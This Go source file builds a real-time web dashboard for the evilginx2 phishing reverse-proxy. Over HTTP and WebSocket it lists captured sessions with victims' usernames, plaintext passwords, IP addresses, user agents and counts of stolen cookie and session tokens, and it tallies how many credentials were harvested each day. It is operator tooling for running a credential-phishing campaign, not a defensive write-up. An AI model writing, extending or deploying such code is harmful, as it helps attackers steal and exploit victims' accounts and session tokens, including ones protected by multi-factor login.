package core

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"strconv"
	"sync"
	"time"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// Optimized WebDashboard with performance improvements
type OptimizedWebDashboard struct {
	server          *http.Server
	router          *mux.Router
	config          *Config
	db              *database.Database
	proxy           *HttpProxy
	upgrader        websocket.Upgrader
	clients         map[*websocket.Conn]*ClientInfo
	clientsMux      sync.RWMutex
	broadcast       chan []byte
	isRunning       bool
	port            int
	
	// Performance optimizations
	sessionCache    map[string]*DashboardSession
	sessionCacheMux sync.RWMutex
	statsCache      *DashboardStats
	statsCacheMux   sync.RWMutex
	lastStatsUpdate time.Time
	
	// Rate limiting
	rateLimiter     map[string]time.Time
	rateLimiterMux  sync.RWMutex
	
	// Connection management
	maxClients      int
	clientTimeout   time.Duration
	
	// Background workers
	ctx             context.Context
	cancel          context.CancelFunc
	workerWg        sync.WaitGroup
}

type ClientInfo struct {
	conn       *websocket.Conn
	lastSeen   time.Time
	remoteAddr string
	userAgent  string
}

type OptimizedDashboardSession struct {
	ID          string    `json:"id"`
	Index       int       `json:"index"`
	Phishlet    string    `json:"phishlet"`
	Username    string    `json:"username"`
	Password    string    `json:"password"`
	LandingURL  string    `json:"landing_url"`
	UserAgent   string    `json:"user_agent"`
	RemoteAddr  string    `json:"remote_addr"`
	IsDone      bool      `json:"is_done"`
	CreateTime  time.Time `json:"create_time"`
	UpdateTime  time.Time `json:"update_time"`
	TokenCount  int       `json:"token_count"`
	Country     string    `json:"country"`
	City        string    `json:"city"`
}

func NewOptimizedWebDashboard(config *Config, db *database.Database, proxy *HttpProxy, port int) *OptimizedWebDashboard {
	ctx, cancel := context.WithCancel(context.Background())
	
	dashboard := &OptimizedWebDashboard{
		config:          config,
		db:              db,
		proxy:           proxy,
		port:            port,
		clients:         make(map[*websocket.Conn]*ClientInfo),
		broadcast:       make(chan []byte, 1000), // BUFFERED CHANNEL
		sessionCache:    make(map[string]*DashboardSession),
		rateLimiter:     make(map[string]time.Time),
		maxClients:      100,
		clientTimeout:   30 * time.Second,
		ctx:             ctx,
		cancel:          cancel,
		upgrader: websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool {
				return true
			},
			ReadBufferSize:  1024,
			WriteBufferSize: 1024,
		},
	}

	dashboard.setupRoutes()
	return dashboard
}

func (d *OptimizedWebDashboard) Start() error {
	if d.isRunning {
		return fmt.Errorf("dashboard is already running")
	}

	// Start background workers
	d.workerWg.Add(4)
	go d.handleMessages()
	go d.cleanupClients()
	go d.updateCache()
	go d.rateLimitCleanup()

	d.isRunning = true
	log.Info("Optimized web dashboard starting on port %d", d.port)
	log.Info("Access dashboard at: http://localhost:%d", d.port)
	
	return d.server.ListenAndServe()
}

func (d *OptimizedWebDashboard) Stop() error {
	if !d.isRunning {
		return nil
	}
	
	d.isRunning = false
	d.cancel() // Cancel background workers
	
	// Close broadcast channel
	close(d.broadcast)
	
	// Close all WebSocket connections
	d.clientsMux.Lock()
	for client := range d.clients {
		client.Close()
	}
	d.clientsMux.Unlock()
	
	// Wait for workers to finish
	d.workerWg.Wait()
	
	return d.server.Close()
}

// OPTIMIZED: Asynchronous message broadcasting
func (d *OptimizedWebDashboard) handleMessages() {
	defer d.workerWg.Done()
	
	for {
		select {
		case message, ok := <-d.broadcast:
			if !ok {
				return
			}
			
			d.broadcastToClients(message)
			
		case <-d.ctx.Done():
			return
		}
	}
}

// OPTIMIZED: Non-blocking broadcast to clients
func (d *OptimizedWebDashboard) broadcastToClients(message []byte) {
	d.clientsMux.RLock()
	clients := make([]*websocket.Conn, 0, len(d.clients))
	for client := range d.clients {
		clients = append(clients, client)
	}
	d.clientsMux.RUnlock()
	
	// Broadcast to clients in parallel
	for _, client := range clients {
		go func(c *websocket.Conn) {
			// Set write deadline to prevent blocking
			c.SetWriteDeadline(time.Now().Add(5 * time.Second))
			
			if err := c.WriteMessage(websocket.TextMessage, message); err != nil {
				log.Debug("Error broadcasting message: %v", err)
				d.removeClient(c)
			}
		}(client)
	}
}

// OPTIMIZED: Client cleanup worker
func (d *OptimizedWebDashboard) cleanupClients() {
	defer d.workerWg.Done()
	
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			d.cleanupStaleClients()
			
		case <-d.ctx.Done():
			return
		}
	}
}

func (d *OptimizedWebDashboard) cleanupStaleClients() {
	d.clientsMux.Lock()
	defer d.clientsMux.Unlock()
	
	now := time.Now()
	for conn, info := range d.clients {
		if now.Sub(info.lastSeen) > d.clientTimeout {
			log.Debug("Cleaning up stale client: %s", info.remoteAddr)
			conn.Close()
			delete(d.clients, conn)
		}
	}
}

// OPTIMIZED: Cache update worker
func (d *OptimizedWebDashboard) updateCache() {
	defer d.workerWg.Done()
	
	ticker := time.NewTicker(5 * time.Second)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			d.refreshStatsCache()
			
		case <-d.ctx.Done():
			return
		}
	}
}

func (d *OptimizedWebDashboard) refreshStatsCache() {
	stats := d.calculateStats()
	
	d.statsCacheMux.Lock()
	d.statsCache = stats
	d.lastStatsUpdate = time.Now()
	d.statsCacheMux.Unlock()
}

// OPTIMIZED: Rate limiter cleanup
func (d *OptimizedWebDashboard) rateLimitCleanup() {
	defer d.workerWg.Done()
	
	ticker := time.NewTicker(1 * time.Minute)
	defer ticker.Stop()
	
	for {
		select {
		case <-ticker.C:
			d.cleanupRateLimiter()
			
		case <-d.ctx.Done():
			return
		}
	}
}

func (d *OptimizedWebDashboard) cleanupRateLimiter() {
	d.rateLimiterMux.Lock()
	defer d.rateLimiterMux.Unlock()
	
	now := time.Now()
	for ip, lastSeen := range d.rateLimiter {
		if now.Sub(lastSeen) > 5*time.Minute {
			delete(d.rateLimiter, ip)
		}
	}
}

// OPTIMIZED: Rate limiting for API endpoints
func (d *OptimizedWebDashboard) isRateLimited(remoteAddr string) bool {
	d.rateLimiterMux.Lock()
	defer d.rateLimiterMux.Unlock()
	
	now := time.Now()
	if lastSeen, exists := d.rateLimiter[remoteAddr]; exists {
		if now.Sub(lastSeen) < 100*time.Millisecond { // 10 requests per second max
			return true
		}
	}
	
	d.rateLimiter[remoteAddr] = now
	return false
}

// OPTIMIZED: WebSocket handler with connection limits
func (d *OptimizedWebDashboard) handleWebSocket(w http.ResponseWriter, r *http.Request) {
	// Check connection limit
	d.clientsMux.RLock()
	clientCount := len(d.clients)
	d.clientsMux.RUnlock()
	
	if clientCount >= d.maxClients {
		http.Error(w, "Too many connections", http.StatusTooManyRequests)
		return
	}
	
	// Check rate limiting
	if d.isRateLimited(r.RemoteAddr) {
		http.Error(w, "Rate limited", http.StatusTooManyRequests)
		return
	}
	
	conn, err := d.upgrader.Upgrade(w, r, nil)
	if err != nil {
		log.Error("WebSocket upgrade error: %v", err)
		return
	}
	defer conn.Close()

	// Add client with info
	clientInfo := &ClientInfo{
		conn:       conn,
		lastSeen:   time.Now(),
		remoteAddr: r.RemoteAddr,
		userAgent:  r.Header.Get("User-Agent"),
	}
	
	d.clientsMux.Lock()
	d.clients[conn] = clientInfo
	d.clientsMux.Unlock()

	log.Debug("WebSocket client connected: %s", r.RemoteAddr)

	// Send initial data
	d.sendInitialData(conn)

	// Handle client messages with ping/pong
	conn.SetReadDeadline(time.Now().Add(60 * time.Second))
	conn.SetPongHandler(func(string) error {
		conn.SetReadDeadline(time.Now().Add(60 * time.Second))
		
		// Update last seen
		d.clientsMux.Lock()
		if info, exists := d.clients[conn]; exists {
			info.lastSeen = time.Now()
		}
		d.clientsMux.Unlock()
		
		return nil
	})

	// Keep connection alive
	for {
		_, _, err := conn.ReadMessage()
		if err != nil {
			log.Debug("WebSocket client disconnected: %s", r.RemoteAddr)
			d.removeClient(conn)
			break
		}
	}
}

func (d *OptimizedWebDashboard) removeClient(conn *websocket.Conn) {
	d.clientsMux.Lock()
	delete(d.clients, conn)
	d.clientsMux.Unlock()
}

// OPTIMIZED: Cached statistics
func (d *OptimizedWebDashboard) handleGetStats(w http.ResponseWriter, r *http.Request) {
	if d.isRateLimited(r.RemoteAddr) {
		http.Error(w, "Rate limited", http.StatusTooManyRequests)
		return
	}
	
	d.statsCacheMux.RLock()
	stats := d.statsCache
	d.statsCacheMux.RUnlock()
	
	if stats == nil {
		stats = d.calculateStats()
	}
	
	d.sendJSONResponse(w, stats)
}

// OPTIMIZED: Paginated sessions with caching
func (d *OptimizedWebDashboard) handleGetSessions(w http.ResponseWriter, r *http.Request) {
	if d.isRateLimited(r.RemoteAddr) {
		http.Error(w, "Rate limited", http.StatusTooManyRequests)
		return
	}
	
	limit := 50
	offset := 0
	
	if l := r.URL.Query().Get("limit"); l != "" {
		if parsed, err := strconv.Atoi(l); err == nil && parsed > 0 && parsed <= 100 {
			limit = parsed
		}
	}
	
	if o := r.URL.Query().Get("offset"); o != "" {
		if parsed, err := strconv.Atoi(o); err == nil && parsed >= 0 {
			offset = parsed
		}
	}
	
	sessions := d.getSessionsPaginated(limit, offset)
	d.sendJSONResponse(w, sessions)
}

// OPTIMIZED: Efficient session retrieval
func (d *OptimizedWebDashboard) getSessionsPaginated(limit, offset int) []*DashboardSession {
	sessions, err := d.db.ListSessions()
	if err != nil {
		log.Error("Error getting sessions: %v", err)
		return []*DashboardSession{}
	}
	
	// Sort by creation time (newest first)
	// In production, this should be handled by the database
	
	var dashboardSessions []*DashboardSession
	start := offset
	end := offset + limit
	
	if start >= len(sessions) {
		return dashboardSessions
	}
	
	if end > len(sessions) {
		end = len(sessions)
	}
	
	for i := start; i < end; i++ {
		session := sessions[i]
		dashboardSession := &DashboardSession{
			ID:         session.SessionId,
			Index:      session.Id,
			Phishlet:   session.Phishlet,
			Username:   session.Username,
			Password:   session.Password,
			LandingURL: session.LandingURL,
			UserAgent:  session.UserAgent,
			RemoteAddr: session.RemoteAddr,
			IsDone:     session.Username != "" && session.Password != "",
			CreateTime: time.Unix(session.CreateTime, 0),
			UpdateTime: time.Unix(session.UpdateTime, 0),
			TokenCount: len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens),
		}
		
		dashboardSessions = append(dashboardSessions, dashboardSession)
	}
	
	return dashboardSessions
}

// OPTIMIZED: Efficient statistics calculation
func (d *OptimizedWebDashboard) calculateStats() *DashboardStats {
	sessions, err := d.db.ListSessions()
	if err != nil {
		return &DashboardStats{}
	}
	
	stats := &DashboardStats{}
	today := time.Now().Truncate(24 * time.Hour)
	
	for _, session := range sessions {
		stats.TotalSessions++
		
		if session.Username != "" {
			stats.TotalCredentials++
		}
		
		if session.Username != "" && session.Password != "" {
			stats.CompletedSessions++
		} else {
			stats.ActiveSessions++
		}
		
		stats.TotalTokens += len(session.CookieTokens) + len(session.BodyTokens) + len(session.HttpTokens)
		
		if time.Unix(session.CreateTime, 0).After(today) {
			stats.TodaySessions++
		}
	}
	
	return stats
}

// OPTIMIZED: Non-blocking broadcast
func (d *OptimizedWebDashboard) BroadcastMessage(msgType string, data interface{}) {
	message := WSMessage{
		Type: msgType,
		Data: data,
	}
	
	jsonData, err := json.Marshal(message)
	if err != nil {
		log.Error("Error marshaling broadcast message: %v", err)
		return
	}
	
	select {
	case d.broadcast <- jsonData:
		// Message sent successfully
	default:
		// Channel is full, log warning but don't block
		log.Warning("Broadcast channel full, dropping message of type: %s", msgType)
	}
}

func (d *OptimizedWebDashboard) sendJSONResponse(w http.ResponseWriter, data interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(data)
}

func (d *OptimizedWebDashboard) sendInitialData(conn *websocket.Conn) {
	// Send current stats
	d.statsCacheMux.RLock()
	stats := d.statsCache
	d.statsCacheMux.RUnlock()
	
	if stats != nil {
		d.sendToClient(conn, "stats_update", stats)
	}
	
	// Send recent sessions
	sessions := d.getSessionsPaginated(20, 0)
	for _, session := range sessions {
		d.sendToClient(conn, "session_update", session)
	}
}

func (d *OptimizedWebDashboard) sendToClient(conn *websocket.Conn, msgType string, data interface{}) {
	message := WSMessage{
		Type: msgType,
		Data: data,
	}
	
	jsonData, err := json.Marshal(message)
	if err != nil {
		log.Error("Error marshaling WebSocket message: %v", err)
		return
	}
	
	conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	err = conn.WriteMessage(websocket.TextMessage, jsonData)
	if err != nil {
		log.Error("Error sending WebSocket message: %v", err)
	}
} 